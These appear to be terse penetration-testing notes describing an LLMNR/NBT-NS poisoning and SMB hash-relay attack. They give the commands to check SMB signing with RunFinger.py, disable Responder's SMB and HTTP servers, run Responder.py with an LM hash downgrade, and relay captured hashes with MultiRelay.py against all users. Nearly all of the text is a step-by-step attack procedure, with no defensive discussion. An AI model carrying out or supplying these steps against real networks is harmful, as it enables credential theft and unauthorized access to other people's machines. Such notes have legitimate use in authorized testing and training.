MITM LLMNR and NBT-NS

Responder/MultiRelay are used for hash relays
Responder is able to spoof messages if someone accidently puts in the wrong smb information
Responder will act as if it is the SMB share the user is looking for and obtain the username and password

For this attack to work SMB signing must be disabled
	We can see this through an NMAP scan or by using RunFinger.py
python RunFinger.py -i <target ip>

To launch responder/multirelay attack

Modify the responder.conf configuration file
set SMB server and HTTP server to off

launch the responder.py with -I (interface)
	We can also downgrade the NTML hashes if supported with --lm
	python Responder.py -I eth0 --lm
	Open a new terminal window
	python MultiRelay.py -t <targetIP> -u ALL
